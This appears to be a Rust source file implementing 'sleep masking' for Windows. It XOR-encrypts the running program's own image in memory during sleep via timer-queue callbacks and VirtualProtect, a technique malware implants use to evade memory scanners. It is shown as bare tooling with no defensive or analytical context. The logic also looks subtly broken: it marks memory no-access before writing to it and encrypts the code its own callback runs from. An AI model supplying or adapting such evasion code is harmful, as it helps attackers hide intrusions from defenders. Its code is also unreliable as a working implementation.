#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    System::{
        Threading::{
            CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx,
            WT_EXECUTEINTIMERTHREAD,
        },
        LibraryLoader::GetModuleHandleA,
    },
    Foundation::HANDLE,
};

#[cfg(target_os = "windows")]
static mut SLEEP_KEY: [u8; 16] = [0u8; 16];

#[cfg(target_os = "windows")]
pub unsafe fn masked_sleep(duration_ms: u32) {
    use rand::RngCore;
    rand::rngs::OsRng.fill_bytes(&mut SLEEP_KEY);

    let image_base = GetModuleHandleA(core::ptr::null()) as *mut u8;
    let image_size = get_image_size(image_base);

    let timer_queue = CreateTimerQueue();

    let ctx1 = Box::into_raw(Box::new(SleepCtx { base: image_base, size: image_size, encrypt: true }));
    let mut t1: HANDLE = 0;
    CreateTimerQueueTimer(
        &mut t1, timer_queue,
        Some(sleep_callback), ctx1 as _, 0, 0,
        WT_EXECUTEINTIMERTHREAD,
    );

    let ctx2 = Box::into_raw(Box::new(SleepCtx { base: image_base, size: image_size, encrypt: false }));
    let mut t2: HANDLE = 0;
    CreateTimerQueueTimer(
        &mut t2, timer_queue,
        Some(sleep_callback), ctx2 as _, duration_ms, 0,
        WT_EXECUTEINTIMERTHREAD,
    );

    windows_sys::Win32::System::Threading::Sleep(duration_ms + 100);
    DeleteTimerQueueEx(timer_queue, windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE);
}

#[cfg(target_os = "windows")]
struct SleepCtx { base: *mut u8, size: usize, encrypt: bool }

#[cfg(target_os = "windows")]
unsafe extern "system" fn sleep_callback(ctx: *mut core::ffi::c_void, _: u8) {
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_NOACCESS, PAGE_EXECUTE_READ};
    let ctx = &*(ctx as *const SleepCtx);
    let mut old = 0u32;
    if ctx.encrypt {
        VirtualProtect(ctx.base as _, ctx.size, PAGE_NOACCESS, &mut old);
        xor_region(ctx.base, ctx.size, &SLEEP_KEY);
    } else {
        xor_region(ctx.base, ctx.size, &SLEEP_KEY);
        VirtualProtect(ctx.base as _, ctx.size, PAGE_EXECUTE_READ, &mut old);
    }
}

#[cfg(target_os = "windows")]
unsafe fn xor_region(base: *mut u8, size: usize, key: &[u8; 16]) {
    for i in 0..size {
        *base.add(i) ^= key[i % 16];
    }
}

#[cfg(target_os = "windows")]
unsafe fn get_image_size(base: *mut u8) -> usize {
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    *(base.add(e_lfanew + 0x18 + 0x38) as *const u32) as usize
}
